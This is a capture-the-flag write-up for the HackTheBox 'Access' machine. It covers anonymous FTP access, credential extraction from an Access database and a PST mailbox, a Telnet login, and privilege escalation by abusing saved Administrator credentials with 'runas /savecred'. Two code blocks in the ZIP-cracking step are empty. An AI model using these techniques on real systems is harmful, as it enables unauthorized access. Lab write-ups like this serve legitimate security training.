# HTB Access

## 1. Initial Enumeration

**Target:** `10.129.8.179`

An Nmap scan was performed to identify exposed services.

```
nmap -sC -sV -oN nmap.txt 10.129.8.179
```

### Results

|Port|Service|Finding|
|---|---|---|
|21|FTP|Microsoft FTP; anonymous login allowed|
|23|Telnet|Microsoft Telnet Server|
|80|HTTP|Microsoft IIS 7.5; title: MegaCorp|

Anonymous FTP access was the most promising starting point because it allowed access without valid credentials.

## 2. Anonymous FTP Enumeration

Connected to the FTP service:

```
ftp 10.129.8.179
```

Logged in using the `anonymous` account and enumerated the available directories.

```
Backups/
Engineer/
```

The `Backups` directory contained `backup.mdb`, while `Engineer` contained a password-protected archive named `Access Control.zip`.

Downloaded both files:

```
get backup.mdb
get "Access Control.zip"
```

The database was useful because it contained application user records. The ZIP archive appeared to contain additional information that could lead to credentials.

## 3. Extracting Credentials from the Database

The Microsoft Access database was enumerated using `mdb-tools`.

First, list the available tables:

```
mdb-tables ./backup.mdb
```

The output included an `auth_user` table, which looked relevant to authentication.

Export the table:

```
mdb-export ./backup.mdb auth_user
```

Relevant records:

```
admin,[REDACTED]
engineer,[REDACTED]
backup_admin,[REDACTED]
```

The `engineer` account's recovered password was used as a candidate for the password-protected ZIP archive.


## 4. Cracking the Password-Protected ZIP

Initially, the archive was tested with 7-Zip:

```
7z x "Access Control.zip"
```

It requested a password.

A password hash was extracted with `zip2john`:

```
zip2john "Access Control.zip" > hash.txt
```

A small wordlist was created from the database credentials:

```

```

Then John the Ripper was used:

```

```

## 5. Recovering the Security Account Password from Email

The PST email archive was processed using `readpst`:

```
readpst "Access Control.pst"
```

This produced `Access Control.mbox`.

Inspecting the mailbox revealed an email with the subject:

```
MegaCorp Access Control System "security" account
```

The message stated that the password for the `security` account had been changed to **[REDACTED]**.

This provided credentials to test against the exposed remote-access service.


## 6. Initial Shell Through Telnet

The target exposed Microsoft Telnet on TCP port 23.

Connect:

```
telnet 10.129.8.179 23
```

Authenticate with the recovered `security` credentials.

Verify the resulting identity:

```
whoami
```

Output:

```
access\security
```

This established an interactive shell as the `security` user.

At this stage, the objective was to enumerate the environment for additional credentials, privileged applications, misconfigurations, and accessible files.

## 7. Enumerating Saved Credentials

While operating as `access\security`, inspect Windows Credential Manager entries:

```
cmdkey /list
```

The output revealed:

```
Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator
```

This was a significant finding: Windows had a stored credential entry associated with `ACCESS\Administrator`.

However, a stored credential entry alone does not prove that arbitrary processes can successfully reuse it. Further investigation was needed to understand how the credentials were configured to be used.

### Why this matters

The Windows `runas` utility can launch a process under another account. When usable credentials have been saved for that account, the `/savecred` option may allow subsequent launches without prompting for the password again.

If a lower-privileged user can reuse saved administrator credentials to run arbitrary commands, this can become a local privilege-escalation path.

## 8. Privilege Escalation with `runas /savecred`

The saved Administrator credential was the key finding.

The successful test used `runas` to launch a command that read the Administrator's flag and redirected the result into a file accessible to the current user:

```
runas /user:Administrator /savecred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt >> C:\Users\security\flag.txt"
```

The resulting file was then read:

```
type C:\Users\security\flag.txt
```

**Flag:** `[REDACTED]`

This confirmed access to the protected flag through a command executed using the saved Administrator credentials.


## 9. SQL Server Investigation - Separate Lead

During enumeration, `C:\temp\scripts\README_FIRST.txt` revealed SQL Server connection details:

```
Server: LOCALHOST
Authentication: SQL Server Authentication
Login: sa
Password: [REDACTED]
```

The document also described scripts intended to create a `sysdba` login, alter server roles, attach a database, modify database authorization, configure firewall ports, and change directory access rules.

These findings were worth investigating, but the available notes do not establish that the SQL Server path was required to obtain the flag. The documented successful escalation was through saved Administrator credentials.
